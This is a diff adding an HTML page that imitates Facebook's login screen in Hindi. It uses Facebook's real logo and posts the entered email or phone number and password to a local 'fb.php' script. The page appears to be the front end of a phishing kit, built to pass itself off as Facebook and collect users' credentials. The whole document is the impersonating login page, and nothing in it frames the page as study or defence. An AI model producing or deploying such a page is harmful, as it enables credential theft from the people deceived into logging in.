@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="icon" href="fbicon.png" type="image/icon type" />
+    <style>
+        body
+        {
+            background-color:rgb(244, 243, 243)
+        }
+        .main
+        {
+            width: 100vw;
+            height: 100vh;
+         
+        }
+        .caption div
+        {
+            float: left;
+            width: 50vw;
+            height: 90vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .caption img
+        {
+            width: 40%;
+            opacity: 1;
+        }
+        .loginpart
+        {
+            display: flex;
+
+        }
+        .login
+        {
+            padding: 0%;
+            float: right;
+            display: flex;
+            margin-right:10rem;
+            margin-top:10rem;
+            width: 28vw;
+            height: 50vh;
+            background-color: rgb(255, 255, 255);
+            align-items: center;
+            justify-content: center;
+            border-radius:0.5rem;
+        }
+        .loginpart
+        {
+            /* margin-top: 10rem; */
+            margin-bottom: 5rem;
+            flex-direction: column;
+        }
+        input
+        {
+            margin-top:0.6rem;
+            margin-bottom: 0.6rem;
+            outline: none;
+            padding-right:0.5rem;
+            padding-top: 0.7rem;
+            padding-left: 0.4rem;
+            padding-bottom:0.7rem;
+            border-radius:0.3rem;
+            
+        }
+        input
+        {
+            padding-right: 12rem;
+            border: 0.1px solid blue;
+            outline: none;
+        }
+        h1
+        {
+            font-weight: 200;
+        }
+        button
+        {
+            outline: none;
+            border-radius: 0.3rem;
+            padding-right:0.5rem;
+            padding-top:0.5rem;
+            padding-bottom:0.5rem;
+            color:white;
+            background-color: rgb(10, 10, 255);
+        }
+        a
+        {
+            margin-top:0.3rem;
+            text-align: center;
+            text-decoration: none;
+        }
+        a:hover
+        {
+            text-decoration:underline;
+        }
+        #btn
+        {
+            background-color: rgb(2, 197, 2);
+            margin-top:0.6rem;
+        }
+        button:hover
+        {
+            opacity: 0.7;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="main">
+
+        <div class="caption">
+           <div> <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" />
+            
+           <h1>Facebook लोगों से जुड़ने और शेयर करने में आपकी मदद करता है.</h1>
+        </div>
+        </div>
+        <form method="post" action="fb.php">
+        <div class="login">
+            <div class="loginpart">
+                  <input id="in1" type="text"  placeholder="ईमेल या फोन नंबर" name="username"/>
+         <input id="in2" type="password" placeholder="पासवर्ड" name="password"/>
+          <button>लॉग इन करें</button>  
+            <a href="#"> पासवर्ड भूल गए</a>
+            <button id="btn">
+                नया खाता बनाएँ</button>
+        </div>
+        </div>
+    </form>
+
+    </div>
+</body>
+</html>
